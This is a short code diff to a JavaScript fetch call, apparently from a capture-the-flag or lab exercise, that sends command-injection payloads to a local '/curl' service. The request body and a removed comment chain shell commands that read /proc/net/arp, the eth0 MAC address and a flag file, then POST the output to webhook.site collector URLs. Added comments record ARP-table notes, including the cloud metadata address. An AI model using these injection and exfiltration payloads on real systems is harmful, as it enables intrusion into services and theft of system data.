@@ -13,10 +13,15 @@
         const res = await fetch("http://localhost:8001/curl", {
             method: "POST",
             headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "cmd=file:///proc/net/arp | curl -X POST --data-binary @- https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/q= | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
-             // replace with the command you want//; ls>ls.txt; curl -X POST --data-binary @ls.txt https://webhook.site/5f2015ad-18c3-440b-a001-ba821f7b59d2\\
+            body: "cmd=file:///sys/class/net/eth0/address | curl -X POST --data-binary @- https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/q= | curl -X POST --data-binary @/proc/self/fd/0 https://webhook.site/97912302-411f-4587-b7b9-055611f6df06/p=`/flag`"
 
-            //Things need for crack proc/net/arp
+            //Things need for crack /proc/net/arp
+
+            //IP address       HW type     Flags       HW address            Mask     Device
+            //10.254.0.5       0x1         0x2         c6:23:fc:cf:c3:ff     *        eth0
+            //169.254.169.254  0x1         0x2         06:01:23:45:67:01     *        eth0
+
+            // /sys/class/net/eth0/address 
         });
         const data = await res.text();
 
